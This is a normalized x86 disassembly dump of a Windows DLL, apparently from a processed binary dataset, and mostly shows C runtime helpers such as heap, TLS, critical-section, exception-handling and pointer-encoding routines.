push [ esi + 0x4 ]
call sub_1001750d
pop ecx
sub_10016fb6
mov [ ecx ] r--data
jmp sub_10016f3c
sub_1001702b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100173b1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1001750d
sub_100173bc
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1001b5aa
pop ecx
retn
sub_1001766d
call sub_1001c0b4
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1001be8b
sub_10017c53
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1001bf4a
sub_10017db1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_1001e1a9
pop ecx
pop ecx
retn
sub_10018275
call sub_1001c0b4
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1001be8b
sub_1001829e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_10018275
sub_100182ba
call sub_1001c0b4
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1001be8b
sub_100182e0
call sub_1001c0b4
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1001be8b
sub_10018306
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_1001e56c
push 0x1
push 0x0
call sub_1001b311
add esp 0xc
jmp sub_1001b2de
call eax
sub_10018b6e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10018d31
call sub_1001d546
retn
sub_10018d37
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10018cfb
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_10018e21
push 0xd
call sub_1001fc7b
pop ecx
retn
sub_10018e2d
push 0xc
call sub_1001fc7b
pop ecx
retn
sub_10018e36
xor eax eax
retn
sub_10019b07
push 0xc
call sub_1001fc7b
pop ecx
retn
sub_10019b13
push 0xc
call sub_1001fc7b
pop ecx
retn
sub_10019b44
and [ esi + 0x70 ] 0xffffffef
retn
sub_10019eda
call sub_1001c0b4
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1001be8b
sub_1001a24e
mov [ ecx ] r--data
jmp sub_10016fb6
sub_1001a3ac
push [ ebp - 0x14 ]
call sub_1001a2df
pop ecx
retn
sub_1001a3f0
call sub_1001c0b4
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1001c0b4
dec [ eax + 0x90 ]
sub_1001a492
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1001a49b
mov esp [ ebp - 0x18 ]
call sub_1001e754
sub_1001a4cd
call sub_1001c0b4
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_1001a554
push 0x4
mov eax sub_10028451
call sub_10018b38
call sub_1001c0b4
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1001e78d
call sub_1001e7a0
sub_1001a62d
mov eax [ ebp - 0x14 ]
call sub_1001a40a
retn
sub_1001a8a4
xor eax eax
inc eax
retn
sub_1001a8a8
mov esp [ ebp - 0x18 ]
call sub_1001e754
sub_1001a93d
xor eax eax
inc eax
retn
sub_1001a941
mov esp [ ebp - 0x18 ]
call sub_1001e754
sub_1001ae34
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10017006
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001af37
mov eax sub_10022960
mov [ rw-data ] eax
mov [ rw-data ] sub_10022056
mov [ rw-data ] sub_1002200a
mov [ rw-data ] sub_10022043
mov [ rw-data ] sub_10021fac
mov [ rw-data ] eax
mov [ rw-data ] sub_100228d8
mov [ rw-data ] sub_10021fc8
mov [ rw-data ] sub_10021f2a
mov [ rw-data ] sub_10021eb6
retn
sub_1001af97
mov edi edi
push ebp
mov ebp esp
call sub_1001af37
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_100229a6
sub_1001b2c7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b1a4
add esp 0xc
pop ebp
retn
sub_1001b59a
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1001b611
push 0xe
call sub_1001fc7b
pop ecx
retn
sub_1001b6a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001b75a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001b8f4
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_1001b912
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_1001bef8
push 0xc
call sub_1001fc7b
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1001bf0d
call [ TlsAlloc@IAT ]
retn 0x4
sub_1001c029
push 0xd
call sub_1001fc7b
pop ecx
retn
sub_1001c032
push 0xc
call sub_1001fc7b
pop ecx
retn
sub_1001c1e8
push 0xd
call sub_1001fc7b
pop ecx
retn
sub_1001c1f4
push 0xc
call sub_1001fc7b
pop ecx
retn
sub_1001c6a4
push 0xd
call sub_1001fc7b
pop ecx
retn
sub_1001ca73
push 0xd
call sub_1001fc7b
pop ecx
retn
sub_1001caac
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1001c912
pop ecx
mov [ rw-data ] 0x1
sub_1001d3e4
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1001d3f4
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1001d4b5
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1001d525
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1001d4fa
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_1001d53d
push 0x8
call sub_1001fd54
pop ecx
retn
sub_1001d546
push 0x8
call sub_1001fc7b
pop ecx
retn
sub_1001d768
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1001fc7b
pop ecx
sub_1001d77d
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1001d63d
add esp 0xc
pop ebp
retn
sub_1001d793
push 0x1
push 0x0
push 0x0
call sub_1001d63d
add esp 0xc
retn
sub_1001d7a2
mov edi edi
push ebp
mov ebp esp
call sub_1001e71b
push [ ebp + 0x8 ]
call sub_1001e56c
pop ecx
push 0xff
call sub_1001d77d
int3
sub_1001deb5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1001e537
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001e754
push 0x8
push r--data
call sub_1001de70
call sub_1001c0b4
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1001b2de
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001e774
xor eax eax
inc eax
retn
sub_1001e78d
call sub_1001c0b4
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1001e754
call eax
sub_1001e7a0
push 0x8
push r--data
call sub_1001de70
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_1001e754
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001e7c4
xor eax eax
inc eax
retn
sub_1001e7d8
push sub_1001e754
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_1001e83c
mov eax rw-data
retn
sub_1001e842
mov eax rw-data
retn
sub_1001fc7b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001fd4b
push 0xa
call sub_1001fc7b
pop ecx
retn
sub_10021dc0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_100252a0
sub_10021dd6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_100252a0
sub_10021ea4
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_1002200a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021fc8
add esp 0x10
pop ebp
retn
sub_10022043
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10021eb6
pop ecx
pop ecx
pop ebp
retn
sub_10022056
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10021f2a
pop ecx
pop ecx
pop ebp
retn
sub_10022a06
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100229ce
pop ecx
pop ecx
pop ebp
retn
sub_10022ac7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10022b1c
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10022c90
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1001fc7b
pop ecx
sub_10022ccc
and [ rw-data ] 0x0
retn
sub_10022db6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10022ce0
add esp 0xc
pop ebp
retn 0x4
sub_10022de9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10024fe5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10022e1b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10022ce0
add esp 0xc
pop ebp
retn 0x8
sub_10023051
push [ ebp + 0x8 ]
call sub_10026ac3
pop ecx
retn
sub_10023824
push ebx
call sub_10026ac3
pop ecx
retn
sub_100238cb
mov eax rw-data
retn
sub_10023982
call sub_10026e82
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1001750d
pop ecx
retn
call sub_10026c5c
sub_10023aa6
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_1002494c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10024a7b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_10024aff
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10024aac
add esp 0x10
pop ebp
retn
sub_10024fb9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10024ef0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10025004
call eax
retn
sub_10025147
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_100270b6
add esp 0xc
pop ebp
retn
sub_1002574f
push 0x2
call sub_1001d7a2
sub_10026aba
push 0xa
call sub_1001fc7b
pop ecx
retn
sub_10026c42
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10026b2c
add esp 0x10
pop ebp
retn
sub_10026cef
push 0x1
call sub_1001fc7b
pop ecx
retn
sub_10026e4a
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10023a51
pop ecx
pop ecx
retn
sub_10026e79
push 0x1
call sub_1001fc7b
pop ecx
retn
sub_10026e82
push 0x1
call sub_10026da8
pop ecx
retn
sub_1002806d
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_1002808c
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_1002817c
push esi
call sub_10023a15
pop ecx
retn
sub_10028255
push ebx
call sub_10026ac3
pop ecx
retn
sub_100283b5
push ebx
call sub_10026ac3
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10028400
lea ecx [ ebp - 0x10 ]
jmp sub_100163e1
sub_10028408
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028423
mov ecx [ ebp - 0x10 ]
jmp sub_10002eb0
sub_1002842b
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_100038f0
sub_10028436
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028451
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028470
mov ecx [ ebp + 0x8 ]
jmp sub_100163e1
sub_10028478
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_100038f0
sub_10028483
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_100038f0
sub_1002848e
mov ecx [ ebp + 0x8 ]
add ecx 0x14
jmp sub_100038f0
sub_10028499
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
jmp sub_100038f0
sub_100284a4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100284c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100284e0
mov ecx [ ebp + 0x8 ]
jmp sub_100163e1
sub_100284e8
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_100038f0
sub_100284f3
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_100038f0
sub_100284fe
mov ecx [ ebp + 0x8 ]
add ecx 0x14
jmp sub_100038f0
sub_10028509
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
jmp sub_100038f0
sub_10028514
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028530
mov eax [ ebp - 0x14 ]
push eax
call sub_100173b1
pop ecx
retn
sub_1002853b
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x38 ]
push ecx
call sub_10002d70
sub_10028555
mov ecx [ ebp - 0x14 ]
jmp sub_10002eb0
sub_1002855d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028580
mov eax [ ebp - 0x10 ]
push eax
call sub_100173b1
pop ecx
retn
sub_1002858b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100285b0
lea ecx [ ebp - 0x18 ]
jmp sub_100163e1
sub_100285b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100285e0
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10016412
sub_100285eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028610
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028630
lea ecx [ ebp - 0x58 ]
jmp sub_10002ec0
sub_10028638
lea ecx [ ebp - 0x2c ]
jmp sub_10001a80
sub_10028640
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028670
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_10003f70
sub_1002867b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100286a0
mov eax [ ebp - 0x10 ]
push eax
call sub_100173b1
pop ecx
retn
sub_100286ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100286d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100286f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028710
lea ecx [ ebp - 0x2c ]
jmp sub_10001a80
sub_10028718
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028740
lea ecx [ ebp - 0x90 ]
jmp sub_10002ec0
sub_1002874b
lea ecx [ ebp - 0x48 ]
jmp sub_10001a80
sub_10028753
lea ecx [ ebp - 0x2c ]
jmp sub_10001a80
sub_1002875b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x94 ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028790
lea ecx [ ebp - 0x84 ]
jmp sub_10002ec0
sub_1002879b
lea ecx [ ebp - 0x48 ]
jmp sub_10001a80
sub_100287a3
lea ecx [ ebp - 0x2c ]
jmp sub_10001a80
sub_100287ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100287e0
lea ecx [ ebp - 0x48 ]
jmp sub_10001a80
sub_100287e8
lea ecx [ ebp - 0x2c ]
jmp sub_10001a80
sub_100287f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028820
lea ecx [ ebp - 0x40 ]
jmp sub_10002ec0
sub_10028828
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10016ec3
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028850
lea ecx [ ebp - 0x48 ]
jmp sub_10002ec0
sub_10028858
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10016ec3
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028880
lea ecx [ ebp - 0x4c ]
jmp sub_10002ec0
sub_10028888
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100288b0
lea ecx [ ebp - 0x50 ]
jmp sub_10002ec0
sub_100288b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100288e0
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_10003910
sub_100288eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028910
lea ecx [ ebp - 0x98 ]
jmp sub_10002ec0
sub_1002891b
lea ecx [ ebp - 0x4c ]
jmp sub_10001a80
sub_10028923
lea ecx [ ebp - 0x30 ]
jmp sub_10001a80
sub_1002892b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028960
lea ecx [ ebp + 0x8 ]
jmp sub_10002ec0
sub_10028968
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028990
lea esi [ ebp + 0x8 ]
jmp sub_10001af0
sub_10028998
lea esi [ ebp - 0x2c ]
jmp sub_10001af0
sub_100289a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_100289d0
lea ecx [ ebp - 0x50 ]
jmp sub_10002ec0
sub_100289d8
lea esi [ ebp - 0x4c ]
jmp sub_10001af0
sub_100289e0
lea esi [ ebp - 0x2c ]
jmp sub_10001af0
sub_100289e8
lea esi [ ebp - 0x2c ]
jmp sub_10001af0
sub_100289f0
lea ecx [ ebp - 0x68 ]
jmp sub_10002ec0
sub_100289f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10016ec3
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028a20
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_10003910
sub_10028a2b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028a50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028a70
lea ecx [ ebp - 0x64 ]
jmp sub_10002ec0
sub_10028a78
lea esi [ ebp - 0x4c ]
jmp sub_10001af0
sub_10028a80
lea esi [ ebp - 0x30 ]
jmp sub_10001af0
sub_10028a88
lea esi [ ebp - 0x30 ]
jmp sub_10001af0
sub_10028a90
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10016ec3
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028ac0
mov eax [ ebp + 0x8 ]
jmp sub_10003990
sub_10028ac8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028af0
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028af8
lea eax [ ebp - 0x2c ]
push eax
call sub_100059c0
retn
sub_10028b02
lea ecx [ ebp - 0x1c ]
jmp sub_10002ec0
sub_10028b0a
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028b12
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028b30
lea esi [ ebp + 0x24 ]
jmp sub_10001af0
sub_10028b38
lea esi [ ebp + 0x8 ]
jmp sub_10001af0
sub_10028b40
mov esi [ ebp - 0x10 ]
add esi 0x8
jmp sub_10001af0
sub_10028b4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028b70
lea ecx [ ebp + 0xc ]
jmp sub_10002ec0
sub_10028b78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028ba0
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028ba8
lea eax [ ebp - 0x2c ]
push eax
call sub_100059c0
retn
sub_10028bb2
lea ecx [ ebp - 0x1c ]
jmp sub_10002ec0
sub_10028bba
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028bc2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028be0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov esi [ ebp + 0x8 ]
jmp sub_10001af0
sub_10028bf9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028c20
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028c28
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028c30
lea ecx [ ebp - 0x1c ]
jmp sub_10002ec0
sub_10028c38
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028c60
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028c68
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028c70
lea ecx [ ebp - 0x1c ]
jmp sub_10002ec0
sub_10028c78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
sub_10028ca0
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028ca8
lea eax [ ebp - 0x2c ]
jmp sub_10003990
sub_10028cb0
lea ecx [ ebp - 0x1c ]
jmp sub_10002ec0
sub_10028cb8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10016ec3
mov eax r--data
jmp sub_100187ae
